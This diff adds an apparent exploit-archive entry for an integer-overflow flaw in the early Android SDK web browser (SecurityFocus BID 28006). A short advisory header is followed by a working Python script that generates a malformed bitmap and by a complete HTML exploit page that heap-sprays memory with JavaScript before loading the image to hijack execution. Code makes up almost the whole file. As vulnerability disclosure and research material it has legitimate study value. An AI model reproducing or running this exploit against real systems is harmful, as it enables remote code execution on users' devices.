@@ -1,0 +1,58 @@
+source: http://www.securityfocus.com/bid/28006/info
+
+Android Web Browser is prone to an integer-overflow vulnerability because it fails to adequately handle user-supplied data.
+
+Attackers can exploit this issue to execute arbitrary code in the context of the application. Failed exploit attempts will likely cause denial-of-service conditions.
+
+This issue affects Android SDK m5-rc14 and earlier. 
+
+# This script generates a Bitmap file that makes the Android browser
+jump to the address at 0xffffff+0x10
+# Must be loaded inside a HTML file with a tag like this: <IMG
+src=badbmp.bmp>
+# Alfredo Ortega - Core Security
+import struct
+
+offset = 0xffef0000
+width = 0x0bffff
+height=8
+
+bmp ="\x42\x4d\xff\x00\x00\x00\x00\x00\x00\x00"
+bmp+=struct.pack("<I",offset)
+bmp+="\x28\x00\x00\x00"
+bmp+=struct.pack("<I",width)
+bmp+=struct.pack("<I",height)
+bmp+="\x03\x00\x08\x00\x00\x00"
+bmp+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+bmp+="\x00\x00\x00\x00\x00\x00\x00\x55\x02\xff\x00\x02\x00\x02\x02\xff"
+bmp+="\xff\x11\xff\x33\xff\x55\xff\x66\xff\x77\xff\x88\x41\x41\x41\x41"
+bmp+="\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+bmp+="\x41\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+bmp+="\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+open("badbmp.bmp","wb").write(bmp)
+
+The complete exploit page follows:
+
+
+<HTML>
+<HEAD>
+</HEAD>
+<BODY>
+<script type="text/javascript">
+// Fill 0x200000 - 0xa00000 with Breakpoints
+var nop = unescape("%u0001%uef9f");
+while (nop.length <= 0x100000/2) nop += nop;
+var i = 0;
+for (i = 0;i<5;i++)
+  document.write(nop)
+
+// Fill 0xa00000 - 0x1100000 with address 0x00400040
+var nop = unescape("%u4000%u4000");
+while (nop.length <= 0x100000/2) nop += nop;
+var i = 0;
+for (i = 0;i<2;i++)
+  document.write(nop)
+</script>
+<IMG src=badbmp.bmp>
+</BODY>
+</HTML>
